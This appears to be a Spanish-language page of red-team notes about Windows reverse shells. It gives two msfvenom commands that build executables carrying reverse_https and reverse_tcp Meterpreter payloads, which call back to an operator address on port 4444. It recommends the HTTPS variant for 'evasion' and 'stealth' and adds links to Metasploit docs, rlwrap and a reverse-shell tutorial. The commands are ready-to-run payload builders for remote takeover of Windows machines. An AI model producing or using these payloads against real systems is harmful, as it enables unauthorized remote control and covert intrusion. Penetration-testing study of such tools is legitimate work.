---
title: 🔁Revershell Windows
type: docs
prev: docs/first-page
weight: 8
sidebar:
  open: false
---

## REVERSHELL METERPRETER

### info

- <https://www.sciencedirect.com/topics/computer-science/meterpreter-shell>
- <https://docs.rapid7.com/metasploit/working-with-payloads/>

---

### 🧨 Comando 1

- <https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/windows/meterpreter/reverse_https.md>

```bash
./msfvenom -p windows/meterpreter/reverse_https LHOST=172.16.23.1 LPORT=4444 -f exe -o /tmp/https.exe
```

---

### 💥 Comando 2

- <https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/windows/meterpreter/reverse_tcp.md>

```bash
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe -o /tmp/payload.exe
```

### ✅ Recomendación

- Usa `reverse_https` para entornos donde necesitas **evasión** y **sigilo**.
- Usa `reverse_tcp` para pruebas en **entornos controlados o laboratorio**.

## RLWRAP

[I just learned about rlwrap, that can let your read commands be readline enabled with history and filename completion. (Tip) : r/bash (reddit.com)](https://www.reddit.com/r/bash/comments/12b0woi/i_just_learned_about_rlwrap_that_can_let_your/?tl=es-es)
[Reverse Shells en Windows - Deep Hacking](https://deephacking.tech/reverse-shells-en-windows/)
![imagen error](/images/red_team/revershell/20241015021345.png)
